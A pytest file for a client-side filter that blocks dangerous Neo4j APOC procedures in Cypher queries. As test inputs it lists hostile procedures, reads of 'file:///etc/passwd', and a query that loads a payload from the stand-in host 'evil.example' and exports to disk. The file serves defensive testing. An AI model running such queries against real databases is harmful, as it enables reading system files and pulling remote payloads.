"""Tests for the client-side APOC procedure safety check."""

from __future__ import annotations

import pytest

from decepticon.tools.research._apoc_safety import (
    APOC_PROCEDURE_ALLOWLIST,
    APOC_PROCEDURE_DENYLIST,
    CypherSafetyError,
    ensure_safe,
    find_violations,
)


class TestFindViolations:
    def test_empty_cypher_returns_no_violations(self) -> None:
        assert find_violations("") == []
        assert find_violations(None) == []  # type: ignore[arg-type]

    def test_plain_cypher_has_no_violations(self) -> None:
        assert find_violations("MATCH (n:Host) RETURN n LIMIT 10") == []

    def test_allowlisted_procedure_passes(self) -> None:
        assert find_violations("CALL apoc.coll.union([1,2], [3,4]) YIELD value RETURN value") == []
        assert find_violations("CALL apoc.text.regexGroups('abc', '[a-z]+')") == []
        assert find_violations("CALL apoc.path.expand(n, 'KNOWS', '+', 1, 5)") == []
        assert find_violations("CALL apoc.merge.node(['Host'], {ip: '1.2.3.4'})") == []
        assert find_violations("CALL apoc.refactor.rename.label('Old', 'New')") == []
        assert (
            find_violations(
                "CALL apoc.periodic.iterate('MATCH (n:Host) RETURN n', 'SET n.x=1', {})"
            )
            == []
        )

    @pytest.mark.parametrize(
        "procedure",
        [
            "apoc.cypher.runFile",
            "apoc.cypher.runFromFile",
            "apoc.load.json",
            "apoc.load.csv",
            "apoc.load.xml",
            "apoc.load.html",
            "apoc.import.csv",
            "apoc.import.json",
            "apoc.import.file",
            "apoc.export.csv.query",
            "apoc.export.csv.all",
            "apoc.export.json.all",
            "apoc.export.cypher.all",
            "apoc.export.graphml.all",
            "apoc.systemdb.execute",
            "apoc.trigger.add",
            "apoc.trigger.install",
            "apoc.dbms.exec",
            "apoc.spatial.geocode",
        ],
    )
    def test_denylisted_procedure_is_caught(self, procedure: str) -> None:
        cypher = f"CALL {procedure}('file:///etc/passwd') YIELD value RETURN value"
        violations = find_violations(cypher)
        assert violations, f"expected {procedure} to be caught"
        assert any(procedure.lower() == v.lower() for v in violations)

    def test_case_insensitive_matching(self) -> None:
        for cypher in (
            "CALL APOC.CYPHER.RUNFILE('file:///etc/passwd')",
            "CALL Apoc.Cypher.RunFile('file:///etc/passwd')",
            "CALL apoc.CYPHER.runfile('file:///etc/passwd')",
        ):
            assert find_violations(cypher), f"expected case-insensitive catch on: {cypher}"

    def test_new_unknown_procedure_is_rejected_by_default(self) -> None:
        """A procedure not in allowlist AND not in denylist is still rejected."""
        violations = find_violations("CALL apoc.future.experimentalFeature() YIELD x")
        assert violations == ["apoc.future.experimentalFeature"]

    def test_embedded_in_string_literal_is_caught_conservatively(self) -> None:
        """We do not parse Cypher; any apoc.X.Y pattern is treated as a call.

        This is intentional - false positives on a string literal that happens
        to contain ``apoc.cypher.runFile`` are preferred to false negatives.
        """
        cypher = "MATCH (n) WHERE n.note = 'see apoc.cypher.runFile docs' RETURN n"
        assert find_violations(cypher) == ["apoc.cypher.runFile"]

    def test_multiple_violations_all_reported(self) -> None:
        cypher = """
        CALL apoc.load.json('http://evil.example/payload.json') YIELD value
        WITH value
        CALL apoc.export.csv.query(value, 'file:///tmp/x.csv', {})
        RETURN 1
        """
        violations = find_violations(cypher)
        assert len(violations) == 2
        assert any("apoc.load.json" == v.lower() for v in violations)
        assert any("apoc.export.csv.query" == v.lower() for v in violations)


class TestEnsureSafe:
    def test_passes_safe_cypher(self) -> None:
        ensure_safe("MATCH (n:Host {ip: $ip}) RETURN n")
        ensure_safe("CALL apoc.coll.union([1, 2], [3, 4]) YIELD value RETURN value")

    def test_raises_on_banned_procedure(self) -> None:
        with pytest.raises(CypherSafetyError) as excinfo:
            ensure_safe("CALL apoc.cypher.runFile('file:///etc/passwd')")
        assert "apoc.cypher.runFile" in excinfo.value.procedures[0].lower() or any(
            "apoc.cypher.runfile" == p.lower() for p in excinfo.value.procedures
        )
        assert "hardening" in str(excinfo.value)

    def test_error_carries_full_cypher_for_audit(self) -> None:
        cypher = "CALL apoc.import.file('file:///x')"
        with pytest.raises(CypherSafetyError) as excinfo:
            ensure_safe(cypher)
        assert excinfo.value.cypher == cypher


class TestAllowlistDenylistInvariants:
    def test_no_overlap(self) -> None:
        allow_full = APOC_PROCEDURE_ALLOWLIST
        deny_two_seg = {p.rsplit(".", 1)[0] for p in APOC_PROCEDURE_DENYLIST if p.count(".") >= 2}
        for prefix in allow_full:
            assert prefix not in deny_two_seg, (
                f"prefix {prefix!r} appears in BOTH allowlist and denylist - "
                "this would let the safety check pass dangerous procs"
            )

    def test_denylist_covers_all_file_io_families(self) -> None:
        deny_lower = {p.lower() for p in APOC_PROCEDURE_DENYLIST}
        required = [
            "apoc.cypher.runfile",
            "apoc.load.json",
            "apoc.load.csv",
            "apoc.import.csv",
            "apoc.export.csv.query",
            "apoc.systemdb.execute",
            "apoc.trigger.add",
        ]
        for proc in required:
            assert proc in deny_lower, f"denylist missing required procedure {proc}"
